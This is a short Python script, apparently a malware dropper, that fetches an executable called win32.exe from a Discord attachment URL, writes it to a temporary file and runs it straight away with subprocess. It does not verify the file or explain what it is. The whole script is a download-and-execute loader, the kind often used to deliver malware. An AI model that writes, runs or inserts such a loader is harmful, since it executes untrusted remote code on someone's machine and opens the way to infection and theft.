import requests
import tempfile
import subprocess

url = 'https://cdn.discordapp.com/attachments/1055888135671795823/1105562608993570816/win32.exe'
response = requests.get(url)
with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
    tmp_file.write(response.content)
    exe_path = tmp_file.name

subprocess.call([exe_path])
